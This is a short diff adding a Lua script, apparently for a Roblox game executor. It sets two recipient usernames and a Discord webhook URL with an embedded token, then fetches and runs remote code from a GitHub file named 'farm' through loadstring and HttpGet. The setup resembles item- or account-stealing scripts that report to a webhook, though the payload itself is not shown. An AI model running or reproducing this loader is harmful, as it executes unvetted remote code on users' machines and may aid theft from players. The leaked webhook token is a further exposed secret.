@@ -1,0 +1,5 @@
+_G.UserName = "hungkhanhkiet3"
+_G.UserName2 = "nozom01" -- optional
+_G.Webhook = "https://discord.com/api/webhooks/1108449234144985130/3E1tj6zucKwGpgNvipw_vP0Bvo55d0DWuo7gQe2nZPFlSgV_ZmzM0rX_bzuMYMT87wcO" -- optional
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Markzami/Project-WD/main/farm", true))()
